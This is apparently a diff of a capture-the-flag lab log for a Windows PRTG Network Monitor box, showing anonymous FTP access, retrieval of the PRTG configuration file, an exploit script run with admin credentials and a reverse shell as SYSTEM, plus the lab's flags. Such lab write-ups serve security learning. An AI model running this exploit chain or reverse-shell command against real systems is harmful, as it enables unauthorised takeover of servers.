@@ -68,10 +68,8 @@ Connected to 10.129.17.67.
 230 User logged in.
 Remote system type is Windows_NT.
 
-
 ftp> more Users\\Public\\Desktop\\user.txt
 c5a3c0462ce87b64857fbbff23d35c55
-
 
 ftp> cd Users\\Administrator
 550 Access is denied.
@@ -94,10 +92,8 @@ Connected to 10.129.17.67.
 230 User logged in.
 Remote system type is Windows_NT.
 
-
 ftp> binary 
 200 Type set to I.
-
 
 ftp> get "programdata\\paessler\\PRTG Network Monitor\\PRTG Configuration.dat"
 local: programdata\\paessler\\PRTG Network Monitor\\PRTG Configuration.dat remote: programdata\\paessler\\PRTG Network Monitor\\PRTG Configuration.dat
@@ -174,14 +170,12 @@ Saving to: ‘exploit.py’
 exploit.py                                                 100%[========================================================================================================================================>]  15.67K  --.-KB/s    in 0.001s  
 
 2025-04-18 02:21:33 (18.0 MB/s) - ‘exploit.py’ saved [16049/16049]
-
-                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                          
 └─$ python3.13 exploit.py                                                                                                          
 /home/kali/htb/exploit.py:259: SyntaxWarning: invalid escape sequence '\{'
   print(event + "Hosting payload at [\\\\{}\{}]".format(lhost, shareName))
 usage: exploit.py [-h] -i HOST -p PORT --lhost LHOST --lport LPORT [--user USER] [--password PASSWORD] [--https]
 exploit.py: error: the following arguments are required: -i/--host, -p/--port, --lhost, --lport
-                                                                                                                                                                                                                                            
 
 └─$ python3.13 exploit.py -i 10.129.17.67 -p 80 --lhost 10.10.16.5 --lport 4444 --user "prtgadmin" --password "PrTg@dmin2019"
 /home/kali/htb/exploit.py:259: SyntaxWarning: invalid escape sequence '\{'
@@ -228,16 +222,13 @@ connect to [10.10.16.5] from (UNKNOWN) [10.129.17.67] 59867
 Microsoft Windows [Version 10.0.14393]
 (c) 2016 Microsoft Corporation. All rights reserved.
 
-
 C:\Windows\system32>whoami
 whoami
 nt authority\system
 
-
 C:\Windows\system32>type 'c:\Users\Administrator\Desktop\root.txt'
 cat 'c:\Users\Administrator\Desktop\root.txt'
 74857cea503cf62366e036300f64b6c8
-
 
 C:\Windows\system32>exit
 [*] Disconnecting Share(2:IUGMYMBK)
